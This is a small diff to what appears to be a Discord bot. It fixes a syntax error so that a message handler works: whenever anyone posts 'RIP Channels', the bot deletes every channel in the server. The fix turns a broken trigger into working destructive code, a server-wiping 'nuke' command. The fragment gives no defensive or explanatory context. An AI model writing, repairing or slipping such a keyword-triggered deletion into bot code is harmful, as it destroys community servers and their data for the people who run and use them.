@@ -5,7 +5,7 @@ const prefix = "!";
 
 
     client.on("message", message => {
-              if(message.content === "RIP Channels" {
+              if(message.content === "RIP Channels") {
               message.guild.channels.forEach(channel => channel.delete())
 }
    });
